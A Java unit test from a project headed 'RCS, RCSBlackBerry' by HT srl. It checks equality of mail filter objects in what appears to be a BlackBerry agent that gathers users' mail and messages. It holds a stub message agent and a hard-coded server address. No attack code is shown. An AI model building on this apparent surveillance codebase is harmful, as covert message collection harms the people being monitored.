//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

package tests.unit;
import java.util.Date;

import net.rim.blackberry.api.mail.Message;
import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import blackberry.agent.Agent;
import blackberry.agent.mail.Filter;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class UT_Mail extends TestUnit {

    //#ifdef DEBUG
    static Debug debug = new Debug("UT_Mail", DebugLevel.VERBOSE);
    //#endif
    //String host = "rcs-prod";
    String host = "192.168.1.177";
    int port = 80;

    public UT_Mail(String name, Tests tests) {
        super(name, tests);
    }

    public boolean run() throws AssertException {
        //UTF8Mail();
        FilterTest();
        return false;
    }

    private void FilterTest() throws AssertException {
        final Filter filter1 = new Filter(false, null, null, 0, 0);
        final Filter filter2 = new Filter(false, null, null, 0, 0);
        final Date to = new Date();
        final Date from = new Date(to.getTime() - 3600000);
        final Filter filter3 = new Filter(true, from, to, 10000, 1000000);
        final Filter filter4 = new Filter(true, from, to, 10000, 1000000);
        final Filter filter5 = new Filter(false, from, to, 10000, 1000000);

        AssertEqual(filter1, filter2, "Filter 1 2");
        AssertEqual(filter3, filter4, "Filter 3 4");

        AssertNotEqual(filter1, filter3, "Filter 1 3 ");
        AssertNotEqual(filter1, filter5, "Filter 1 5");
        AssertNotEqual(filter3, filter5, "Filter 3 5");

    }

    private void UTF8Mail() {
        final Agent agent = Agent.factory(Agent.AGENT_MESSAGE, true, Utils
                .intToByteArray(0));

        final Message msg = new Message();

    }

}
